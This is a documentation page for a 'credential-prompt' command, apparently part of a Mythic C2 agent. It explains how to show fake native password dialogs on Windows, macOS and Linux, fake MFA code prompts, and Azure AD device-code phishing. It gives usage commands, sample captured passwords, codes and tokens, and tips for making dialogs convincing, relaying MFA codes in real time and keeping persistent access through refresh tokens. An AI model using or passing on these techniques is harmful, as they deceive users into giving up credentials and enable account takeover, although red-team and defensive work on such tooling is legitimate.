+++
title = "credential-prompt"
chapter = false
weight = 219
hidden = false
+++

## Summary

Display a native credential dialog to capture user credentials. Uses platform-native prompts that are indistinguishable from legitimate system dialogs. Captured credentials are automatically reported to Mythic's credential vault.

- **macOS**: AppleScript `display dialog` with hidden answer field and custom icon
- **Windows**: `CredUIPromptForWindowsCredentialsW` (native Windows credential dialog with domain/username/password)
- **Linux**: `zenity` (GNOME), `kdialog` (KDE), or `yad` (GTK alternative) password entry dialog

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | No | dialog | `dialog` (native credential prompt), `device-code` (OAuth MFA abuse), or `mfa-phish` (fake MFA verification dialog) |
| title | No | "Windows Security" (Win) / "Update Required" (macOS) / "Authentication Required" (Linux) | Dialog title bar text |
| message | No | "Enter your credentials to continue." (Win) / "macOS needs your password..." (macOS) / "Enter your password to continue." (Linux) | Body text displayed in the dialog |
| icon | No | caution | Dialog icon (macOS only): caution, note, or stop |
| tenant_id | No | organizations | Azure AD tenant ID for device-code flow |
| client_id | No | Microsoft Office | OAuth client ID for device-code flow |

## Usage

```
# Default credential dialog
credential-prompt

# Custom title and message
credential-prompt -title "Network Access" -message "Enter your domain credentials to access this resource."

# macOS: Critical-looking dialog with stop icon
credential-prompt -title "Security Alert" -message "Verify your identity to proceed." -icon stop
```

### Example Output (Windows)

```
=== Credential Prompt Result ===

Domain:   CORP
User:     jsmith
Password: P@ssw0rd123
Dialog:   Network Access
```

### Example Output (macOS)

```
=== Credential Prompt Result ===

User:     gary
Password: P@ssw0rd123
Dialog:   Keychain Access
```

### Example Output (Linux)

```
=== Credential Prompt Result ===

User:     gary
Password: P@ssw0rd123
Dialog:   Authentication Required (zenity)
```

## Operational Notes

### Windows
- Uses `CredUIPromptForWindowsCredentialsW` with `CREDUIWIN_GENERIC` flag for plaintext credential capture
- Extracts domain, username, and password via `CredUnPackAuthenticationBufferW`
- Native Windows credential dialog — supports all installed credential providers
- Domain credentials are stored with realm set to the domain name
- Auth buffer is freed with `CoTaskMemFree`; password buffer is zeroed after extraction

### macOS
- Uses AppleScript's `display dialog` with `with hidden answer` for password masking
- 5-minute timeout prevents indefinite waiting
- Choose icons strategically: `caution` for updates, `note` for preferences, `stop` for security alerts
- Pair with `keychain` for password-protected keychain access after capturing credentials

### Linux
- Detects available dialog tool in order: zenity (GNOME), kdialog (KDE), yad
- Returns clear error if no GUI dialog tool is installed
- 5-minute timeout prevents indefinite waiting
- Best suited for Linux desktops (Ubuntu, Fedora, etc.) — headless servers lack GUI tools

### All Platforms
- Cancel detection: user clicking Cancel returns success status with "User cancelled" message
- Empty password submissions are detected and reported
- Credentials are automatically stored in Mythic's credential vault as plaintext

### MFA Phishing Dialog

Display a fake MFA verification dialog to capture TOTP codes, SMS codes, or other verification tokens. Unlike the credential dialog, the text field is **visible** (not masked) since MFA codes are typically displayed.

```
# Default MFA phishing dialog
credential-prompt -action mfa-phish

# Custom messaging
credential-prompt -action mfa-phish -title "Microsoft Authenticator" -message "Enter the 6-digit code from your authenticator app."

# SMS-style phish
credential-prompt -action mfa-phish -title "Phone Verification" -message "Enter the code sent to your phone ending in ***1234."
```

### Example Output (mfa-phish)

```
=== MFA Phishing Result ===

User:     jsmith
Code:     384729
Dialog:   Microsoft Authenticator
Platform: Windows
```

{{% notice tip %}}The captured MFA code has a short validity window (usually 30-60 seconds for TOTP). Use it immediately or pair with a relay proxy for real-time interception.{{% /notice %}}

### OAuth Device Code Flow (MFA Abuse)

Initiate an Azure AD OAuth Device Code Flow to capture OAuth tokens without knowing the user's password. The agent generates a code that must be entered at `https://microsoft.com/devicelogin`. If the target user authenticates (e.g., via social engineering, MFA fatigue), the agent captures access and refresh tokens.

```
# Default: Microsoft Office client, multi-tenant
credential-prompt -action device-code

# Target specific tenant
credential-prompt -action device-code -tenant_id "contoso.onmicrosoft.com"

# Use custom OAuth client ID
credential-prompt -action device-code -client_id "your-app-id" -tenant_id "tenant-id"
```

### Example Output (device-code)

```
=== OAuth Device Code Flow (MFA Fatigue) ===

User Code:   ABCD-EFGH
URL:         https://microsoft.com/devicelogin
Expires:     900 seconds
Client ID:   d3590ed6-52b3-4102-aeff-aad2292ab01c
Tenant:      organizations

Polling for authentication...

[+] USER AUTHENTICATED — Tokens captured!

Token Type:    Bearer
Scope:         https://graph.microsoft.com/.default
Expires In:    3599 seconds

Access Token:  eyJ0eXAiOiJKV1QiLCJub...
Refresh Token: 0.ARoAJR7nxF2V3US...
```

{{% notice tip %}}The refresh token provides persistent access — it can be used to generate new access tokens without re-authenticating. Default client ID (Microsoft Office) is trusted by most Azure AD tenants without admin consent.{{% /notice %}}

## MITRE ATT&CK Mapping

- **T1056.002** — Input Capture: GUI Input Capture
- **T1621** — Multi-Factor Authentication Request Generation
- **T1111** — Multi-Factor Authentication Interception
